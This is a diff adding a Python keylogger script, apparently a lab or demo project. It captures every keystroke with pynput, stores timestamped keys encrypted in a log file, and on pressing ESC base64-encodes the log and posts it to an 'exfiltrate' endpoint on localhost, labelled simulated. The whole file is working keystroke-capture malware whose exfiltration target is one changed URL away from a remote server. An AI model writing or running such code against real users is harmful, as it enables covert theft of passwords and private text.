@@ -1,0 +1,61 @@
+from pynput import keyboard
+from cryptography.fernet import Fernet
+import base64
+import requests
+import os
+from datetime import datetime
+
+LOG_FILE = "log.txt"
+KEY_FILE = "key.key"
+KILL_SWITCH = "ESC"  # Press ESC to stop the logger
+SERVER_URL = "http://127.0.0.1:5000/exfiltrate"
+
+# Generate encryption key
+def generate_key():
+    key = Fernet.generate_key()
+    with open(KEY_FILE, "wb") as f:
+        f.write(key)
+    return key
+
+# Load existing key or create new
+def load_key():
+    if not os.path.exists(KEY_FILE):
+        return generate_key()
+    with open(KEY_FILE, "rb") as f:
+        return f.read()
+
+fernet = Fernet(load_key())
+
+# Encrypt and write to file
+def encrypt_and_log(key):
+    time_stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    raw = f"{time_stamp}: {key}\n".encode()
+    encrypted = fernet.encrypt(raw)
+    with open(LOG_FILE, "ab") as f:
+        f.write(encrypted + b'\n')
+
+# Simulated exfiltration
+def exfiltrate():
+    with open(LOG_FILE, "rb") as f:
+        data = base64.b64encode(f.read())
+    try:
+        requests.post(SERVER_URL, data={"payload": data})
+    except:
+        pass  # If server not running
+
+def on_press(key):
+    try:
+        k = key.char
+    except AttributeError:
+        k = str(key)
+
+    if k == f"Key.{KILL_SWITCH.lower()}":
+        print("[*] Kill switch triggered. Exiting...")
+        exfiltrate()
+        return False
+
+    encrypt_and_log(k)
+
+# Start keylogger
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
